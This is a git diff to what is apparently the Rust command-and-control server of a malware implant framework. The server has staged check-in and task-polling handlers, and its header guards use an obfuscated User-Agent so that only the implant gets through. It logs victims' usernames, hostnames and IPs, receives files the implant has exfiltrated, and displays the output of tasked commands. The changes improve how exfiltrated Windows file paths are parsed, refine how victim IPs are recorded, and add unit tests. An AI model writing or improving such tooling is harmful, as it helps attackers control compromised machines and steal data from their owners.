@@ -1,6 +1,5 @@
 use actix_web::{web, HttpRequest, HttpResponse, Responder};
 use base64::{engine::general_purpose::STANDARD, Engine as _};
-use colored::Colorize;
 use serde::{Deserialize, Serialize};
 use std::path::PathBuf;
 use std::sync::{Arc, Mutex};
@@ -101,10 +100,10 @@ struct TaskResponse {
     /// Rolling request ID; implant must echo this on the next call.
     x_request_id: String,
     /// For backward compatibility during transition
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "String::is_empty")]
     q: String,
     /// For backward compatibility during transition
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "String::is_empty")]
     tasking: String,
     /// For backward compatibility during transition
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -123,16 +122,12 @@ struct TaskResponse {
 // ── Header guards ───────────────────────────────────────────────────────────
 
 fn ua_ok(req: &HttpRequest) -> bool {
-    let expected_str =
-        obfstr!("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko").to_string();
-    let ua = req
-        .headers()
+    req.headers()
         .get("User-Agent")
-        .and_then(|v| v.to_str().ok());
-    match ua {
-        Some(ua) => ua == expected_str,
-        None => false,
-    }
+        .and_then(|v| v.to_str().ok())
+        .is_some_and(|ua| {
+            ua == obfstr!("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+        })
 }
 
 fn cookie_ok(req: &HttpRequest) -> bool {
@@ -143,13 +138,12 @@ fn cookie_ok(req: &HttpRequest) -> bool {
 }
 
 fn parse_file_response(response: &str) -> Option<(String, String)> {
-    if response.starts_with("FILE:") {
-        let parts: Vec<&str> = response.splitn(3, ':').collect();
-        if parts.len() == 3 {
-            return Some((parts[1].to_string(), parts[2].to_string()));
-        }
-    }
-    None
+    // Format: FILE:<path>:<base64_content>
+    // Use rfind(':') because Windows paths contain ':' (e.g. C:\Users\…).
+    // Base64 never contains ':', so the last ':' is always the path/content separator.
+    let rest = response.strip_prefix("FILE:")?;
+    let sep = rest.rfind(':')?;
+    Some((rest[..sep].to_string(), rest[sep + 1..].to_string()))
 }
 
 // ── Input validation ─────────────────────────────────────────────────────────
@@ -157,14 +151,7 @@ fn parse_file_response(response: &str) -> Option<(String, String)> {
 /// Truncate a String to at most `max` bytes, preserving UTF-8 boundaries.
 fn truncate_field(mut s: String, max: usize) -> String {
     if s.len() > max {
-        // Truncate at a valid char boundary
-        let boundary = s
-            .char_indices()
-            .map(|(i, _)| i)
-            .take_while(|&i| i < max)
-            .last()
-            .unwrap_or(0);
-        s.truncate(boundary);
+        s.truncate(s.floor_char_boundary(max));
     }
     s
 }
@@ -188,7 +175,7 @@ fn save_download(link_name: &str, remote_path: &str, b64_content: &str) -> Resul
         .map_err(|e| format!("[-] Failed to decode file content: {}", e))?;
 
     let dest = dest_dir.join(&filename);
-    std::fs::write(&dest, &data).map_err(|e| format!("[-] Failed to write file: {}", e))?;
+    std::fs::write(&dest, data).map_err(|e| format!("[-] Failed to write file: {}", e))?;
 
     Ok(dest)
 }
@@ -224,7 +211,12 @@ pub async fn stage2_handler(
     let username = truncate_field(body.link_username.clone(), 256);
     let hostname = truncate_field(body.link_hostname.clone(), 256);
     let internal_ip = truncate_field(body.internal_ip.clone(), 45);
-    let external_ip = truncate_field(body.external_ip.clone(), 45);
+    // Prefer observed TCP peer address over implant-reported value (implant sends empty string).
+    let external_ip = req
+        .peer_addr()
+        .map(|a| a.ip().to_string())
+        .unwrap_or_else(|| body.external_ip.clone());
+    let external_ip = truncate_field(external_ip, 45);
     let platform = truncate_field(body.platform.clone(), 64);
 
     let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
@@ -275,6 +267,72 @@ pub async fn stage2_handler(
     ));
 
     HttpResponse::Ok().json(resp)
+}
+
+// ── Unit tests ───────────────────────────────────────────────────────────────
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ── truncate_field ───────────────────────────────────────────────────────
+
+    #[test]
+    fn truncate_field_short_string_unchanged() {
+        assert_eq!(truncate_field("hello".into(), 10), "hello");
+    }
+
+    #[test]
+    fn truncate_field_at_exact_limit_unchanged() {
+        assert_eq!(truncate_field("hello".into(), 5), "hello");
+    }
+
+    #[test]
+    fn truncate_field_over_limit_truncated() {
+        assert_eq!(truncate_field("hello world".into(), 5), "hello");
+    }
+
+    #[test]
+    fn truncate_field_utf8_boundary_not_split() {
+        // "café" is 5 UTF-8 bytes (c=1, a=1, f=1, é=2).
+        // Truncating at 4 bytes must yield "caf", not split the 2-byte 'é'.
+        let result = truncate_field("café".into(), 4);
+        assert_eq!(result, "caf");
+        assert!(result.is_char_boundary(result.len()));
+    }
+
+    #[test]
+    fn truncate_field_multibyte_fits_exactly() {
+        // "é" is 2 bytes; max=2 → the whole string is kept.
+        assert_eq!(truncate_field("é".into(), 2), "é");
+    }
+
+    // ── parse_file_response ──────────────────────────────────────────────────
+
+    #[test]
+    fn parse_file_response_valid() {
+        let (path, content) = parse_file_response("FILE:/path/to/file.txt:aGVsbG8=").unwrap();
+        assert_eq!(path, "/path/to/file.txt");
+        assert_eq!(content, "aGVsbG8=");
+    }
+
+    #[test]
+    fn parse_file_response_windows_path_with_colon() {
+        // Windows paths contain ':', base64 never does — rfind must pick the last ':'.
+        let (path, content) = parse_file_response(r"FILE:C:\Users\test\file.txt:aGVsbG8=").unwrap();
+        assert_eq!(path, r"C:\Users\test\file.txt");
+        assert_eq!(content, "aGVsbG8=");
+    }
+
+    #[test]
+    fn parse_file_response_missing_prefix_returns_none() {
+        assert!(parse_file_response("DATA:/path:aGVsbG8=").is_none());
+    }
+
+    #[test]
+    fn parse_file_response_no_separator_returns_none() {
+        assert!(parse_file_response("FILE:nocolon").is_none());
+    }
 }
 
 /// POST /static/get – Stage 3: task polling / output callback.
@@ -425,20 +483,20 @@ pub async fn stage3_handler(
 
     // Print to console outside the lock.
     if let Some((link_name, cli_cmd, output)) = ui_message {
-        const OUTPUT_BOX_WIDTH: usize = 54;
+        const MIN_BOX_WIDTH: usize = 54;
         let now = chrono::Local::now().format("%H:%M:%S");
         let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
-        let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
+        let box_width = header_text.chars().count().max(MIN_BOX_WIDTH);
+        let pad = box_width - header_text.chars().count();
         crate::ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
         crate::ui::print(&format!("║ {}", output));
-        crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)));
+        crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
         tracing::info!(
-            "\n{}\n{}\n{}",
-            format!("╔{}{}╗", header_text, "═".repeat(pad))
-                .cyan()
-                .bold(),
+            "\n╔{}{}╗\n{}\n╚{}╝",
+            header_text,
+            "═".repeat(pad),
             output,
-            format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)).cyan().bold(),
+            "═".repeat(box_width),
         );
     }
 
